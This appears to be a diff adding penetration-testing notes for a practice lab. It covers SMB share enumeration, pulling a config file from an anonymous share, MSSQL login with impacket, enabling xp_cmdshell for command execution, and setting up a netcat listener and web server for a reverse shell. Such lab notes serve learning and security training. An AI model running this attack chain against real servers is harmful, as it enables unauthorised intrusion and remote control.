@@ -59,7 +59,58 @@ SQL> xp_cmdshell "powershell -c pwd"
 
 https://github.com/SecureAuthCorp/impacket/tree/master/examples
 
--------------
+-----------------------------
+
+SMB 
+
+Enumeration
+nmap -sC -sV {TARGET_IP}
+
+smbclient -N -L \\\\{TARGET_IP}\\
+-N : No password
+-L : This option allows you to look at what services are available on a server
+
+We located a couple of interesting shares. Shares ADMIN$ & C$ cannot be accessed as the Access Denied
+error states, however, we can try to access and enumerate the backups share by using the following
+command:
+smbclient -N \\\\{TARGET_IP}\\backups
+
+get prod.dtsConfig
+
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install .
+
+cd impacket/examples/
+python3 mssqlclient.py -h
+
+
+python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
+-windows-auth : this flag is specified to use Windows Authentication
+
+SELECT is_srvrolemember('sysadmin');
+
+EXEC xp_cmdshell 'net user';
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; 
+- Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+
+xp_cmdshell "whoami"
+
+https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
+
+
+
+sudo python3 -m http.server 80
+
+sudo nc -lvnp 443
+
+------------------------------
 
 gobuster
 
